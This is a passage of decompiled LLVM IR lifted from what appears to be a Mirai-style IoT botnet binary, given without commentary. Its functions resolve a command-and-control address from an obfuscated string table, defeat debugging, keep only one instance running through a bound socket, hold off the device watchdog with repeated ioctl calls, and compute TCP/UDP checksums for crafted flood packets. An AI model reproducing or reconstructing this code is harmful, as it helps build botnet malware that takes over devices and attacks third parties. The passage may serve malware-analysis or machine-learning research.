dec_label_pc_bee0.dec_label_pc_bdfc_crit_edge:    ; preds = %dec_label_pc_bee0
  %v1_be00.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_bdfc

dec_label_pc_bef4:                                ; preds = %dec_label_pc_bee0, %dec_label_pc_bdf0
  %v0_bef4 = call i32 @rand_next()
  %v1_bef4 = trunc i32 %v0_bef4 to i16
  %v3_bef8 = load i32, i32* @r6, align 4
  %v4_bef8 = add i32 %v3_bef8, 2
  %v5_bef8 = inttoptr i32 %v4_bef8 to i16*
  store i16 %v1_bef4, i16* %v5_bef8, align 2
  store i32 %v3_bbc4, i32* %r0.global-to-local, align 4
  %v1_bf00 = load i32, i32* @r5, align 4
  %v9_bf00 = icmp eq i32 %v3_bbc4, %v1_bf00
  store i1 %v9_bf00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bf00, label %dec_label_pc_bf08, label %dec_label_pc_be08

dec_label_pc_bf08:                                ; preds = %dec_label_pc_bef4, %dec_label_pc_bdfc
  %v0_bf08 = call i32 @rand_next()
  %v1_bf08 = trunc i32 %v0_bf08 to i16
  store i32 %v0_bf08, i32* %r0.global-to-local, align 4
  %v3_bf0c = load i32, i32* @r4, align 4
  %v4_bf0c = add i32 %v3_bf0c, 28
  %v5_bf0c = inttoptr i32 %v4_bf0c to i16*
  store i16 %v1_bf08, i16* %v5_bf0c, align 2
  br label %dec_label_pc_be08

dec_label_pc_bf14:                                ; preds = %dec_label_pc_bb64
  store i32 %v3_bb54, i32* %r0.global-to-local, align 4
  %v1_bf18 = call i32 @__GI___libc_close(i32 %v3_bb54)
  store i32 %v1_bf18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bf1c

dec_label_pc_bf1c:                                ; preds = %dec_label_pc_bf2c, %dec_label_pc_bb3c, %dec_label_pc_bb24, %dec_label_pc_bf14
  %v1_bf28 = phi i32 [ %v3_bb54, %dec_label_pc_bb3c ], [ %v2_bb30, %dec_label_pc_bb24 ], [ %v1_bf18, %dec_label_pc_bf14 ], [ %v2_bf30, %dec_label_pc_bf2c ]
  store i32 %v18_b8d4, i32* %sb.global-to-local, align 4
  store i32 %v27_b8d4, i32* %lr.global-to-local, align 4
  ret i32 %v1_bf28

dec_label_pc_bf2c.critedge:                       ; preds = %dec_label_pc_bb8c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_bf2c

dec_label_pc_bf2c:                                ; preds = %dec_label_pc_be08, %dec_label_pc_bf2c.critedge, %dec_label_pc_bdb8
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bf30 = call i32 @__GI_time(i32* null)
  store i32 %v2_bf30, i32* %r0.global-to-local, align 4
  %v9_bf38 = icmp eq i32 %v2_bb30, %v2_bf30
  store i1 %v9_bf38, i1* %cpsr_z.global-to-local, align 1
  %v6_bf3c = icmp slt i32 %v2_bb30, %v2_bf30
  br i1 %v6_bf3c, label %dec_label_pc_bf1c, label %dec_label_pc_bdb8

dec_label_pc_bf44:                                ; preds = %dec_label_pc_badc, %bb113
  %v0_bae4.lcssa = phi i32 [ %v1_bab0, %dec_label_pc_badc ], [ %v0_bae4, %bb113 ]
  %v2_bf48 = sub i32 %v0_bae4.lcssa, %v0_ba8c
  store i32 %v2_bf48, i32* @r4, align 4
  %v2_bf4c = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_baa0, i32* %r1.global-to-local, align 4
  store i32 %v2_bf4c, i32* %r0.global-to-local, align 4
  store i32 %v2_bf48, i32* %r2.global-to-local, align 4
  %v3_bf5c = call i32 @util_memcpy(i32 %v2_bf4c, i32 %v2_baa0, i32 %v2_bf48)
  %v2_bf60 = ptrtoint i32* %stack_var_-40 to i32
  %v1_bf64 = load i32, i32* @r4, align 4
  %v2_bf64 = add i32 %v1_bf64, %v2_bf60
  store i32 %v2_bf64, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_bf4c, i32* @r0, align 4
  %v3_bf70 = add i32 %v2_bf64, -36
  %v4_bf70 = inttoptr i32 %v3_bf70 to i8*
  store i8 0, i8* %v4_bf70, align 1
  %v1_bf74 = call i32 @inet_addr(i32 %v2_bf4c)
  store i32 %v1_bf74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb24

dec_label_pc_bf80:                                ; preds = %dec_label_pc_baf0
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bb24

dec_label_pc_bf90:                                ; preds = %dec_label_pc_baf0
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_bb24

dec_label_pc_bfa4:                                ; preds = %dec_label_pc_baf0
  store i32 707416650, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bb24

; uselistorder directives
  uselistorder i32 %v1_bf74, { 1, 0 }
  uselistorder i32 %v2_bf4c, { 0, 1, 3, 2 }
  uselistorder i32 %v2_bf48, { 1, 0, 2 }
  uselistorder i32 %v2_bf30, { 1, 2, 3, 0 }
  uselistorder i32 %v0_bf08, { 1, 0 }
  uselistorder i32 %v0_bee0, { 1, 0 }
  uselistorder i32 %v0_becc, { 1, 0 }
  uselistorder i32 %v7_beb0, { 1, 0, 2 }
  uselistorder i32 %v1_be90, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_be40, { 1, 0 }
  uselistorder i32 %v0_be2c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_be24, { 1, 0 }
  uselistorder i1 %v3_bde8, { 1, 0 }
  uselistorder i1 %v3_beb8, { 1, 0 }
  uselistorder i32 %v1_bd70.pre, { 1, 0 }
  uselistorder i32 %v2_bd68, { 1, 0 }
  uselistorder i32 %v2_bd6815, { 1, 0 }
  uselistorder i32 %v0_bd7417, { 1, 0 }
  uselistorder i32 %v1_bd60, { 1, 0 }
  uselistorder i32 %v3_bc4c, { 1, 0 }
  uselistorder i32 %v3_bc38, { 1, 0 }
  uselistorder i32 %v3_bbf8, { 1, 0 }
  uselistorder i32 %v1_bbcc, { 1, 0 }
  uselistorder i32 %v3_bbc0, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_bbbc, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_bb84, { 1, 0 }
  uselistorder i1 %v7_bb58, { 1, 0 }
  uselistorder i32 %v3_bb54, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_bb40, { 0, 13, 1, 8, 3, 6, 7, 5, 9, 11, 10, 4, 12, 2 }
  uselistorder i32 %v2_bb30, { 2, 1, 0, 3 }
  uselistorder i32 %v0_bb2c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-2184.0, { 0, 3, 2, 1 }
  uselistorder i32 %v1_baf4, { 1, 0 }
  uselistorder i32 %v0_baf0, { 1, 0 }
  uselistorder i32 %v1_bae4, { 1, 2, 0 }
  uselistorder i1 %v7_bad0, { 1, 0 }
  uselistorder i32 %v1_bacc, { 1, 0, 2 }
  uselistorder i1 %v8_bac4, { 1, 0 }
  uselistorder i1 %v7_bac0, { 1, 0 }
  uselistorder i32 %v1_bab4, { 1, 0 }
  uselistorder i8 %v2_baa8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_baac, { 1, 0 }
  uselistorder i32 %v0_bacc, { 1, 2, 3, 0 }
  uselistorder i32 %v2_baa0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ba9c, { 1, 0, 2 }
  uselistorder i32 %v0_ba94, { 1, 0, 2, 3 }
  uselistorder i1 %v7_ba8c, { 1, 0 }
  uselistorder i32 %v0_ba8c, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_ba30, { 1, 0, 2, 3 }
  uselistorder i32 %v6_b9d0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v6_b9b4, { 0, 2, 1, 3 }
  uselistorder i32 %v6_b99c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b984, { 1, 2, 0 }
  uselistorder i32 %v5_b978, { 0, 2, 1 }
  uselistorder i32 %v7_b940, { 1, 0, 2, 3 }
  uselistorder i32 %v1_b928, { 2, 1, 0 }
  uselistorder i32 %v6_b91c, { 1, 0 }
  uselistorder i32 %v2_b904, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 2, 8, 5, 6, 7, 9, 10, 11, 36, 12, 37, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 1, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 4, 5, 6, 7, 8, 9, 2, 48, 50, 10, 49, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 42, 41, 43, 45, 44, 47, 46, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 1, 8, 6, 9, 7, 10, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 23, 21, 22, 24, 25, 33, 26, 27, 28, 29, 30, 31, 32, 37, 34, 35, 36, 38, 40, 39, 42, 41, 43, 44, 45, 47, 46, 48, 49, 51, 50, 52, 54, 53, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 29, 28, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 41, { 1, 2, 3, 0 }
  uselistorder i8 17, { 1, 2, 0 }
  uselistorder i8 -16, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 86, 87, 88, 89, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 77, 78, 79, 80, 81, 82, 83, 84, 85, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder i32 %arg2, { 3, 4, 6, 7, 0, 1, 5, 2, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_bf2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bf1c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_be08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_bdb8, { 1, 0 }
  uselistorder label %dec_label_pc_bd88, { 1, 0 }
  uselistorder label %.thread19, { 2, 0, 1 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %dec_label_pc_bae4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_badc, { 1, 0 }
  uselistorder label %dec_label_pc_bad0, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_bfdc, label %dec_label_pc_bfc4

dec_label_pc_bfc4:                                ; preds = %entry
  %v0_bfcc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_bfc8

dec_label_pc_bfc8:                                ; preds = %dec_label_pc_bfc8, %dec_label_pc_bfc4
  %v0_bfd4 = phi i32 [ %v2_bfd4, %dec_label_pc_bfc8 ], [ 0, %dec_label_pc_bfc4 ]
  %v0_bfcc = phi i32 [ %v5_bfcc, %dec_label_pc_bfc8 ], [ %v0_bfcc.pre, %dec_label_pc_bfc4 ]
  %v0_bfc8 = phi i32 [ %v1_bfc8, %dec_label_pc_bfc8 ], [ %arg1, %dec_label_pc_bfc4 ]
  %v1_bfc8 = add i32 %v0_bfc8, -2
  %v1_bfcc = inttoptr i32 %v0_bfcc to i16*
  %v2_bfcc = load i16, i16* %v1_bfcc, align 2
  %v3_bfcc = zext i16 %v2_bfcc to i32
  %v5_bfcc = add i32 %v0_bfcc, -2
  store i32 %v5_bfcc, i32* @r0, align 4
  %v2_bfd4 = add i32 %v3_bfcc, %v0_bfd4
  %v1_bfc8.cmp = icmp ugt i32 %v1_bfc8, 1
  br i1 %v1_bfc8.cmp, label %dec_label_pc_bfc8, label %dec_label_pc_bfdc.loopexit

dec_label_pc_bfdc.loopexit:                       ; preds = %dec_label_pc_bfc8
  br label %dec_label_pc_bfdc

dec_label_pc_bfdc:                                ; preds = %entry, %dec_label_pc_bfdc.loopexit
  %v1_bfe4 = phi i32 [ %v2_bfd4, %dec_label_pc_bfdc.loopexit ], [ 0, %entry ]
  %v0_bfdc = phi i32 [ %v1_bfc8, %dec_label_pc_bfdc.loopexit ], [ %arg1, %entry ]
  %v7_bfdc = icmp eq i32 %v0_bfdc, 1
  br i1 %v7_bfdc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_bfdc
  %v1_bfe0 = load i32, i32* @r0, align 4
  %v2_bfe0 = inttoptr i32 %v1_bfe0 to i8*
  %v3_bfe0 = load i8, i8* %v2_bfe0, align 1
  %v4_bfe0 = zext i8 %v3_bfe0 to i32
  %v3_bfe4 = add i32 %v1_bfe4, %v4_bfe0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bfdc, %bb
  %v0_bfe8 = phi i32 [ %v1_bfe4, %dec_label_pc_bfdc ], [ %v3_bfe4, %bb ]
  %v3_bfec = urem i32 %v0_bfe8, 65536
  %v4_bff0 = udiv i32 %v0_bfe8, 65536
  %v5_bff0 = add nuw nsw i32 %v4_bff0, %v3_bfec
  %v4_bff4 = udiv i32 %v5_bff0, 65536
  %v5_bff4 = add nuw nsw i32 %v4_bff4, %v5_bff0
  %v1_bff8 = urem i32 %v5_bff4, 65536
  %v3_c000 = xor i32 %v1_bff8, 65535
  ret i32 %v3_c000

; uselistorder directives
  uselistorder i32 %v5_bff0, { 1, 0 }
  uselistorder i32 %v5_bfcc, { 1, 0 }
  uselistorder i32 %v1_bfc8, { 1, 0, 2 }
  uselistorder i32 %v0_bfcc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_bfdc, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c018 = add i32 %arg1, 12
  %v2_c018 = inttoptr i32 %v1_c018 to i32*
  %v3_c018 = load i32, i32* %v2_c018, align 4
  %v1_c01c = add i32 %arg1, 16
  %v2_c01c = inttoptr i32 %v1_c01c to i32*
  %v3_c01c = load i32, i32* %v2_c01c, align 4
  %v7_c020 = icmp sgt i32 %arg3, 1
  br i1 %v7_c020, label %dec_label_pc_c02c.preheader, label %dec_label_pc_c040

dec_label_pc_c02c.preheader:                      ; preds = %entry
  %v0_c030.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c02c

dec_label_pc_c02c:                                ; preds = %dec_label_pc_c02c.preheader, %dec_label_pc_c02c
  %v0_c038 = phi i32 [ 0, %dec_label_pc_c02c.preheader ], [ %v2_c038, %dec_label_pc_c02c ]
  %v0_c030 = phi i32 [ %v0_c030.pre, %dec_label_pc_c02c.preheader ], [ %v5_c030, %dec_label_pc_c02c ]
  %v0_c02c = phi i32 [ %arg3, %dec_label_pc_c02c.preheader ], [ %v1_c02c, %dec_label_pc_c02c ]
  %v1_c02c = add nsw i32 %v0_c02c, -2
  %v1_c030 = inttoptr i32 %v0_c030 to i16*
  %v2_c030 = load i16, i16* %v1_c030, align 2
  %v3_c030 = zext i16 %v2_c030 to i32
  %v5_c030 = add i32 %v0_c030, -2
  store i32 %v5_c030, i32* @r1, align 4
  %v2_c038 = add i32 %v3_c030, %v0_c038
  %v8_c03c = icmp sgt i32 %v1_c02c, 1
  br i1 %v8_c03c, label %dec_label_pc_c02c, label %dec_label_pc_c040.loopexit

dec_label_pc_c040.loopexit:                       ; preds = %dec_label_pc_c02c
  br label %dec_label_pc_c040

dec_label_pc_c040:                                ; preds = %dec_label_pc_c040.loopexit, %entry
  %v1_c04c = phi i32 [ %v2_c038, %dec_label_pc_c040.loopexit ], [ 0, %entry ]
  %v0_c040 = phi i32 [ %v1_c02c, %dec_label_pc_c040.loopexit ], [ %arg3, %entry ]
  %v7_c040 = icmp eq i32 %v0_c040, 1
  br i1 %v7_c040, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c040
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c040
  %v1_c044 = load i32, i32* @r1, align 4
  %v2_c044 = inttoptr i32 %v1_c044 to i8*
  %v3_c044 = load i8, i8* %v2_c044, align 1
  %v4_c044 = zext i8 %v3_c044 to i32
  %v3_c04c = add i32 %v4_c044, %v1_c04c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c074 = phi i32 [ %v1_c04c, %.thread ], [ %v3_c04c, %bb ]
  %v0_c054 = mul i32 %v3_c018, 65536
  %v3_c054 = udiv i32 %v0_c054, 65536
  %v3_c058 = urem i32 %v3_c01c, 65536
  %v4_c060 = udiv i32 %v3_c018, 65536
  %v2_c05c = add nuw nsw i32 %v3_c058, %v4_c060
  %v5_c060 = add nuw nsw i32 %v2_c05c, %v3_c054
  %v1_c064 = add i32 %arg1, 9
  %v2_c064 = inttoptr i32 %v1_c064 to i8*
  %v3_c064 = load i8, i8* %v2_c064, align 1
  %v4_c064 = zext i8 %v3_c064 to i32
  %v4_c068 = udiv i32 %v3_c01c, 65536
  %v3_c070 = mul nuw nsw i32 %v4_c064, 256
  %v5_c068 = add i32 %v4_c068, %arg2
  %v2_c06c = add i32 %v5_c068, %v1_c074
  %v2_c074 = add i32 %v2_c06c, %v5_c060
  %v2_c078 = add i32 %v2_c074, %v3_c070
  %tmp = icmp ult i32 %v2_c078, 65536
  br i1 %tmp, label %dec_label_pc_c098, label %dec_label_pc_c084

dec_label_pc_c084:                                ; preds = %bb19, %dec_label_pc_c084
  %v2_c08c5 = phi i32 [ %v2_c08c, %dec_label_pc_c084 ], [ %v2_c078, %bb19 ]
  %v3_c0906.in = phi i32 [ %v2_c08c, %dec_label_pc_c084 ], [ %v2_c078, %bb19 ]
  %v3_c0906 = udiv i32 %v3_c0906.in, 65536
  %v3_c088 = urem i32 %v2_c08c5, 65536
  %v2_c08c = add nuw nsw i32 %v3_c088, %v3_c0906
  %tmp20 = icmp ult i32 %v2_c08c, 65536
  br i1 %tmp20, label %dec_label_pc_c098.loopexit, label %dec_label_pc_c084

dec_label_pc_c098.loopexit:                       ; preds = %dec_label_pc_c084
  br label %dec_label_pc_c098

dec_label_pc_c098:                                ; preds = %dec_label_pc_c098.loopexit, %bb19
  %v0_c098 = phi i32 [ %v2_c08c, %dec_label_pc_c098.loopexit ], [ %v2_c078, %bb19 ]
  %v1_c098 = urem i32 %v0_c098, 65536
  %v3_c0a0 = xor i32 %v1_c098, 65535
  ret i32 %v3_c0a0

; uselistorder directives
  uselistorder i32 %v2_c08c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c078, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c04c, { 1, 0 }
  uselistorder i32 %v5_c030, { 1, 0 }
  uselistorder i32 %v0_c030, { 1, 0 }
  uselistorder i32 %v3_c018, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c084, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c02c, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_c0c4.66 to i32), i32* @global_var_20da4.68, align 4
  ret i32 %arg1
}

define i32 @resolve_c2_addr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_c0cc = call i32 @table_unlock_val(i32 1)
  store i32 ptrtoint (i16** @global_var_23a30.70 to i32), i32* @r4, align 4
  store i32 -1378207815, i32* @global_var_23a34.72, align 4
  %v3_c0e4 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_c0e4 = inttoptr i32 %v3_c0e4 to i16*
  %v3_c0e8 = load i16, i16* %v4_c0e4, align 2
  store i16 %v3_c0e8, i16* bitcast (i32* @global_var_23a32.73 to i16*), align 4
  %v1_c0f4 = call i32 @table_lock_val(i32 1)
  ret i32 %v1_c0f4
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i16, align 2
  %stack_var_-28 = alloca i32, align 4
  %v9_c108 = load i32, i32* @r6, align 4
  %v12_c108 = load i32, i32* @r7, align 4
  %v15_c108 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_c124 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_20d9c.75 to i32), i32* @r6, align 4
  %v7_c12c = icmp eq i32 %v3_c124, -1
  store i32 %v3_c124, i32* @global_var_20d9c.75, align 4
  br i1 %v7_c12c, label %dec_label_pc_c1e4, label %dec_label_pc_c138

dec_label_pc_c138:                                ; preds = %entry
  %v2_c138 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_c138, i32* @r3, align 4
  %v0_c13c = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_c14c = call i32 @__GI_setsockopt(i32 %v3_c124, i32 %v0_c13c, i32 2, i32 %v2_c138, i32 4)
  %v2_c150 = load i32, i32* @global_var_20d9c.75, align 4
  store i32 %v2_c150, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_c160 = call i32 @__libc_fcntl(i32 %v2_c150, i32 3)
  %v0_c164 = load i32, i32* @r5, align 4
  %v1_c168 = or i32 %v2_c160, 2048
  store i32 %v1_c168, i32* @r2, align 4
  %v0_c16c = load i32, i32* @r4, align 4
  %v2_c170 = call i32 @__libc_fcntl(i32 %v0_c16c, i32 %v0_c164)
  store i32 ptrtoint (i8** @global_var_20da8.77 to i32), i32* @r8, align 4
  %v2_c178 = load i8, i8* bitcast (i8** @global_var_20da8.77 to i8*), align 4
  %v2_c17c = icmp eq i8 %v2_c178, 0
  br i1 %v2_c17c, label %.thread3, label %bb

.thread3:                                         ; preds = %dec_label_pc_c138
  br label %bb21

bb:                                               ; preds = %dec_label_pc_c138
  br label %bb21

bb21:                                             ; preds = %.thread3, %bb
  %v0_c1a0 = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_c1a8 = inttoptr i32 %v0_c1a0 to i32*
  store i32 0, i32* %v2_c1a8, align 4
  %v2_c1ac = ptrtoint i16* %stack_var_-44 to i32
  store i32 %v2_c1ac, i32* @r5, align 4
  store i32 %v0_c1a0, i32* @r4, align 4
  %v2_c1bc = load i32, i32* @global_var_20d9c.75, align 4
  store i16 2, i16* %stack_var_-44, align 2
  %v7_c1c8 = call i32 @bind(i32 %v2_c1bc, i32 %v2_c1ac, i32 16, i32 2, i32 2)
  %v7_c1cc = icmp eq i32 %v7_c1c8, -1
  br i1 %v7_c1cc, label %dec_label_pc_c1f0, label %dec_label_pc_c1d4

dec_label_pc_c1d4:                                ; preds = %bb21
  %v2_c1dc = load i32, i32* @global_var_20d9c.75, align 4
  %v2_c1e0 = call i32 @listen(i32 %v2_c1dc, i32 1)
  br label %dec_label_pc_c1e4

dec_label_pc_c1e4:                                ; preds = %entry, %dec_label_pc_c1fc, %dec_label_pc_c1d4
  %v1_c1ec = phi i32 [ %v3_c124, %entry ], [ %v1_c238, %dec_label_pc_c1fc ], [ %v2_c1e0, %dec_label_pc_c1d4 ]
  store i32 %v9_c108, i32* @r6, align 4
  store i32 %v12_c108, i32* @r7, align 4
  store i32 %v15_c108, i32* @r8, align 4
  ret i32 %v1_c1ec

dec_label_pc_c1f0:                                ; preds = %bb21
  %v0_c1f0 = load i32, i32* @r4, align 4
  %v1_c1f0 = inttoptr i32 %v0_c1f0 to i32*
  %v2_c1f0 = load i32, i32* %v1_c1f0, align 4
  %v7_c1f4 = icmp eq i32 %v2_c1f0, 99
  br i1 %v7_c1f4, label %dec_label_pc_c240, label %dec_label_pc_c1fc

dec_label_pc_c1fc:                                ; preds = %dec_label_pc_c240, %bb22, %dec_label_pc_c1f0
  %v2_c214 = load i32, i32* @global_var_20d9c.75, align 4
  store i16 2, i16* %stack_var_-44, align 2
  %v3_c224 = call i32 @__libc_connect(i32 %v2_c214, i32 %v2_c1ac, i32 16)
  %v1_c22c = call i32 @sleep(i32 5)
  %v2_c230 = load i32, i32* @global_var_20d9c.75, align 4
  %v1_c234 = call i32 @__GI___libc_close(i32 %v2_c230)
  %v1_c238 = call i32 @ensure_single_instance(i32 %v1_c234)
  br label %dec_label_pc_c1e4

dec_label_pc_c240:                                ; preds = %dec_label_pc_c1f0
  %v2_c240 = load i8, i8* bitcast (i8** @global_var_20da8.77 to i8*), align 4
  %v3_c240 = zext i8 %v2_c240 to i32
  %v1_c244 = load i32, i32* @r7, align 4
  %v9_c244 = icmp eq i32 %v3_c240, %v1_c244
  br i1 %v9_c244, label %dec_label_pc_c1fc, label %bb22

bb22:                                             ; preds = %dec_label_pc_c240
  %v2_c24c = trunc i32 %v1_c244 to i8
  store i8 %v2_c24c, i8* bitcast (i8** @global_var_20da8.77 to i8*), align 4
  br label %dec_label_pc_c1fc

; uselistorder directives
  uselistorder i32 %v2_c1ac, { 1, 0, 2 }
  uselistorder i32 %v3_c124, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i16* %stack_var_-44, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @bind, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_20da8.77 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_20da8.77, { 1, 0 }
  uselistorder label %dec_label_pc_c1fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c1e4, { 1, 2, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_c260 = load i32, i32* @r4, align 4
  %v6_c260 = load i32, i32* @r5, align 4
  %v9_c260 = load i32, i32* @lr, align 4
  %v0_c268 = call i32 @__libc_fork()
  %v7_c26c = icmp eq i32 %v0_c268, -1
  %. = zext i1 %v7_c26c to i32
  %tmp12 = icmp slt i32 %v0_c268, 1
  %storemerge5 = select i1 %tmp12, i32 %., i32 1
  store i32 %storemerge5, i32* @r5, align 4
  %v2_c288 = icmp eq i32 %storemerge5, 0
  store i32 %v0_c268, i32* @global_var_20f18.80, align 4
  br i1 %v2_c288, label %dec_label_pc_c2a0, label %dec_label_pc_c294

dec_label_pc_c294:                                ; preds = %entry
  store i32 %v3_c260, i32* @r4, align 4
  store i32 %v6_c260, i32* @r5, align 4
  store i32 %v9_c260, i32* @lr, align 4
  ret i32 %v0_c268

dec_label_pc_c2a0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_c2ac = call i32 @table_unlock_val(i32 17)
  %v1_c2b4 = call i32 @table_unlock_val(i32 18)
  %v0_c2b8 = load i32, i32* @r5, align 4
  %v2_c2c0 = inttoptr i32 %v0_c2b8 to i32*
  %v3_c2c0 = call i32 @table_retrieve_val(i32 17, i32* %v2_c2c0)
  %v3_c2c8 = call i32 @__libc_open(i32 %v3_c2c0, i64* inttoptr (i32 2 to i64*))
  %v7_c2cc = icmp eq i32 %v3_c2c8, -1
  store i32 %v3_c2c8, i32* @r4, align 4
  br i1 %v7_c2cc, label %dec_label_pc_c314, label %dec_label_pc_c2d8

dec_label_pc_c2d8:                                ; preds = %dec_label_pc_c314, %dec_label_pc_c2a0
  %v0_c2e4 = phi i32 [ %v3_c324, %dec_label_pc_c314 ], [ %v3_c2c8, %dec_label_pc_c2a0 ]
  %v2_c2e8 = ptrtoint i32* %stack_var_-20 to i32
  %v3_c2ec = call i32 @ioctl(i32 %v0_c2e4, i32 -2147199228, i32 %v2_c2e8)
  br label %dec_label_pc_c2f0

dec_label_pc_c2f0:                                ; preds = %dec_label_pc_c2f0, %dec_label_pc_c2d8
  %v0_c2fc = load i32, i32* @r4, align 4
  %v3_c304 = call i32 @ioctl(i32 %v0_c2fc, i32 -2147199227, i32 0)
  %v1_c30c = call i32 @sleep(i32 10)
  br label %dec_label_pc_c2f0

dec_label_pc_c314:                                ; preds = %dec_label_pc_c2a0
  %v0_c314 = load i32, i32* @r5, align 4
